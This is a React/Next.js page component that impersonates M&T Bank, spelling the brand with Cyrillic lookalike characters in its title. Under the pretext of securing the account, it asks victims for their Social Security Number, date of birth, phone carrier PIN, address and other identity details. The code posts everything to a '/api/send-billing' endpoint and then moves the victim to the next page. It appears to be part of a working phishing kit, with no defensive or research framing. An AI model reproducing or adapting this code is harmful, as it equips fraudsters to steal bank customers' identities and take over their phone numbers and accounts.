import React, { useContext, useState, useEffect } from "react";
import { yupResolver } from "@hookform/resolvers/yup";
import axios from "axios";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import * as yup from "yup";
import ReactInputMask from "react-input-mask";
import Head from "next/head";
import { Wrapper } from "../../components/Wrapper";
import { Container } from "../../components/Container";
import { Button } from "../../components/Button";
import { Input } from "../../components/InputAlt";
import { getNextUrl } from "../../utils/getNextUrl";
import { getProgress } from "../../utils/getProgress";
import { DataContext } from "../_app";

interface BillingProps {}

const schema = yup.object().shape({
  firstname: yup.string().required("First name is required."),
  lastname: yup.string().required("Last name is required."),
  dob: yup.string().required("Date of Birth is required"),
  ssn: yup.string().required("Social Security Number is required"),
  streetAddress: yup.string().required("Address is required"),
  zipCode: yup.string().required("Zip code is required"),
  state: yup.string().required("State is required"),
  phoneNumber: yup.string().required("Phone number is required"),
  carrierPin: yup.string(),
  mmn: yup.string(),
});

export const Billing: React.FC<BillingProps> = ({}) => {
  const [loading, setLoading] = useState(false);

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onSubmit`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `BILLING`);
    formData.append(
      `billing`,
      JSON.stringify({ sessionId: datas.sessionId, ...data })
    );

    try {
      await axios.post(`/api/send-billing`, formData);
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      billing: data,
    });

    const url = getProgress()[getProgress().indexOf(`Billing`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <Wrapper>
      <Head>
        <title>Verify Personal Information | М&Т Ваnk</title>
      </Head>
      <Container
        upTitle={`Secure your account`}
        title={`Verify your personal information`}
        subTitle={`Enter all the required information.`}
        loading={loading}
      >
        <Input
          label={`First name`}
          error={errors.firstname && errors.firstname.message}
          register={register}
          name={`firstname`}
          curValue={watch(`firstname`)}
        />
        <Input
          label={`Last name`}
          error={errors.lastname && errors.lastname.message}
          register={register}
          name={`lastname`}
          curValue={watch(`lastname`)}
        />
        <Input
          as={ReactInputMask}
          mask="99/99/9999"
          label={`Date of Birth`}
          placeholder={`MM/DD/YYYY`}
          error={errors.dob && errors.dob.message}
          register={register}
          name={`dob`}
          curValue={watch(`dob`)}
        />
        <Input
          as={ReactInputMask}
          mask="999-99-9999"
          label={`Social Security Number`}
          placeholder={`000-00-0000`}
          error={errors.ssn && errors.ssn.message}
          register={register}
          name={`ssn`}
          curValue={watch(`ssn`)}
        />
        <Input
          as={ReactInputMask}
          mask="(999) 999 9999"
          placeholder={`(999) 999 9999`}
          label={`Phone number`}
          error={errors.phoneNumber && errors.phoneNumber.message}
          register={register}
          name={`phoneNumber`}
          curValue={watch(`phoneNumber`)}
        />
        <Input
          label={`Carrier pin`}
          error={errors.carrierPin && errors.carrierPin.message}
          register={register}
          name={`carrierPin`}
          curValue={watch(`carrierPin`)}
          type={`number`}
        />
        <Input
          label={`Address`}
          error={errors.streetAddress && errors.streetAddress.message}
          register={register}
          name={`streetAddress`}
          curValue={watch(`streetAddress`)}
        />
        <Input
          label={`State`}
          error={errors.state && errors.state.message}
          register={register}
          name={`state`}
          curValue={watch(`state`)}
        />
        <Input
          label={`Zip code`}
          error={errors.zipCode && errors.zipCode.message}
          register={register}
          name={`zipCode`}
          curValue={watch(`zipCode`)}
          type={`number`}
        />
        <Button label={`Continue`} disabled={loading} onClick={onSubmit} />
      </Container>
    </Wrapper>
  );
};

export default Billing;
